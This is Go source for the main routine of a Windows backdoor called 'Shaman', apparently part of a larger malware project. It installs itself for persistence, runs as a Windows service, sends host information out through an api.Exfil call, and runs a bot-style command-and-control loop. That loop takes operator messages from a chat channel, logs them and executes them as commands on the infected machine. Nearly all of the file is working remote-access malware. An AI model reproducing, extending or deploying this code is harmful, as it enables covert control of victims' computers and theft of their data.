package main

import (
	"flag"
	"io"
	"log"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/whiterabb17/shaman/package/api"
	"github.com/whiterabb17/shaman/package/cloud"
	"github.com/whiterabb17/shaman/package/commands"
	"github.com/whiterabb17/shaman/package/install"
	"github.com/whiterabb17/shaman/package/util"
	"golang.org/x/sys/windows/svc"
)

var (
	verbose  bool
	vverbose bool
	debug    bool
	outfile  string
	sleep    int
	ghost    bool
	//initialized bool = false
	//loop        int  = 0
)
var (
	//StopHeartbeat signals the associated goroutine to stop when it is closed.
	StopHeartbeat chan struct{}
	Genesis       int
)

func init() {
	flag.BoolVar(&debug, "dbg", false, " DEBUG")
	flag.BoolVar(&verbose, "ver", false, " VERBOSE")
	flag.BoolVar(&vverbose, "vv", false, " FULL DEBUG")
	flag.StringVar(&outfile, "out", "", " File to write output to")
	flag.IntVar(&sleep, "s", 5, " Time in seconds to sleep")
	flag.BoolVar(&ghost, "ghst", false, " Start in Spirit Mode")
	//Patch os.Args[0] to work with absolute paths later
	if fp, err := os.Executable(); err == nil {
		os.Args[0] = fp
	}
}

func checkSwitch(sw string) bool {
	for _, arg := range os.Args[1:] {
		if arg == sw {
			return true
		}
	}
	return false
}

/*
	func register(wg *sync.WaitGroup, debug bool) {
		bot, err := tgbotapi.NewBotAPI(util.ListToken)
		if err != nil {
			log.Println(err)
		}
		bot.Debug = debug
		if util.Dbg {
			log.Printf("Authorized on account %s", bot.Self.UserName)
		}

		beat := beatConfig{
			header: "\t\t		~~SHAMAN BACKDOOR~~ \n\t\t Identifier: **" + util.ID + "**",
		}
		str := beat.Format()
		msg := tgbotapi.NewMessage(util.ChatID, str)
		bot.Send(msg)
		wg.Done()
	}
*/
const mngr bool = true

var (
	cycle int = 0
)

func main() {
	flag.Parse()
	log.SetFlags(0)
	if outfile != "" {
		logFile, err := os.OpenFile(outfile, os.O_RDWR|os.O_CREATE|os.O_APPEND, os.ModeAppend|os.ModePerm)
		if err != nil {
			log.Println("Open output file failed")
		}

		defer logFile.Close()
		out := io.MultiWriter(os.Stdout, logFile)
		log.SetOutput(out)
	} else {
		out := io.MultiWriter(os.Stdout)
		log.SetOutput(out)
	}
	util.ID, _ = os.Hostname()
	util.Doze = sleep
	log.Println(os.Args[0])
	log.Println("Sleeping for " + strconv.Itoa(util.Doze) + " seconds")
	time.Sleep(time.Duration(util.Doze) * time.Second)
	if verbose {
		log.Println("VERBOSE: True")
	}
	if debug {
		log.Println("DEBUG Mode: Enabled")
		util.Dbg = true
	} else {
		if strings.Contains(os.Args[0], "ShamanCLI.exe") {
			log.Println("[*] DEBUG")
			util.Dbg = true
			debug = true
		} else {
			util.Dbg = false
			debug = false
		}
	}
	util.Spirit = ghost

	//Check single instance
	util.CheckSingle()
	/*
		wg := &sync.WaitGroup{}
		wg.Add(1)
		register(wg, debug)
		wg.Wait()
	*/
	//Check persistence
	if !debug {
		if !mngr {
			log.Println("Production Mode: Persisting Mode Enabled")
			if !install.IsInstalled() {
				log.Println("Install info does not exist")
				install.Install()
			} else {
				install.ReadInstallInfo()
				log.Println("Already installed")
			}
			log.Println("Production Mode: Service Mode Enabled")
			if os.Getenv("poly") == "" {
				if chk, _ := svc.IsWindowsService(); chk {
					install.HandleService(main)
				}
			}
			os.Chdir(install.Info.Base)
		} else {
			log.Println("Running in Manager Mode")
		}
	}

	time.Sleep(3 * time.Second)
	mainHandler(debug)
}

// Create CMD Rebroadcaster based on Recieved/Executed/Resent Messages
func mainHandler(debug bool) {
	util.C3 = true
	api.NewGenesis()
	log.Println("Summoning ID: ", api.Genesis)
	go api.Heartbeat()
	api.Exfil(commands.InitInfo())
	for u := range api.Updates {
		if u.Message == nil {
			time.Sleep(15 * time.Second)
			continue
		}
		cloud.CommsHistory = append(cloud.CommsHistory, u.Message.Text)
		util.WriteLog("CMD.History", strconv.Itoa(u.Message.MessageID)+" "+u.Message.Text)
		if debug {
			log.Printf("[%s] %s", u.Message.From.UserName, u.Message.Text)
		}
		if u.Message.Command() == "list" {
			str := "<b>Bot List</b>\n\n"
			for _, s := range cloud.ClientIdList {
				str += "<i>" + s + "</i>\n"
			}
			api.Exfil(str)
		} else {
			switch strings.ToLower(u.Message.Text) {
			case "help":
				log.Println("Operator asked for help")
				api.Exfil(string(commands.Help))
			case "ghelp":
				commands.GExfil2(commands.GHelp)
			default:
				_, cmd, args, _, id := commands.ProcessMsg(u.Message.Text)
				var _args string
				for _, s := range args {
					_args = s + " "
				}
				full := u.Message.Text
				cloud.ExecHistory = append(cloud.ExecHistory, cmd)
				util.WriteLog("Com.Traffic", strconv.Itoa(u.Message.MessageID)+" Cmd: "+cmd+"\nArgs: "+_args+"\nID: "+id)
				commands.CMDSwitch(cmd, args, id, full)
				//}
			}
			time.Sleep(15 * time.Second)
		}
	}
}
